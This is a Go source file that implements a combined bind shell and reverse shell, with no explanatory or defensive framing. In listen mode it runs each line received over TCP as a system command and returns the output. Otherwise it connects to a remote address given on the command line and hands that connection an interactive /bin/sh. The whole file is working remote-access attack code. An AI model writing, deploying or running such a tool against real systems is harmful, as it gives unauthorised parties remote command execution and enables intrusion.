package main

import (
	"os/exec"
	//"fmt"
	"bufio"
	"net"
	"flag"
	"strconv"
	"strings"
	"bytes"
)

func main() {
	var port int
	var listen bool
	var ip string

	flag.IntVar(&port, "p", 9999, "Desired port number. Default is 9999")
	flag.BoolVar(&listen, "l", false, "Set up listener on specified port")
	flag.StringVar(&ip, "r", "localhost", "Remote UP address")
	flag.Parse()

	if listen == true {
		addr := getListenPort(port)
		bindShell(addr)
	}

	if listen == false {
		addr := ip + getListenPort(port)
		revShell(addr)
	}
}


func getListenPort(port int) string {
	p := strconv.Itoa(port)
	addr := ":" + p
	return addr
}


func bindShell(addr string) {
	ln, _ := net.Listen("tcp", addr)
	defer ln.Close()

	for {
		conn, _ := ln.Accept()
		go func(c net.Conn) {
			for {
				msg, err := bufio.NewReader(conn).ReadString('\n')
				if err != nil {
					break
				}

				command:= strings.Trim(msg, "\r\n")

				commandElements := strings.Fields(command)
				cmdName := commandElements[0]
				cmdArgs := commandElements[1:]


				cmd := exec.Command(cmdName, cmdArgs...)
				var b bytes.Buffer
				cmd.Stdout = &b
				cmd.Run()
				conn.Write(b.Bytes())
			}
			c.Close()
		}(conn)
	}
}


func revShell(addr string) {
	c, _ := net.Dial("tcp", addr)
	cmd := exec.Command("/bin/sh")
	cmd.Stdin = c
	cmd.Stdout = c
	cmd.Stderr = c
	cmd.Run()
}
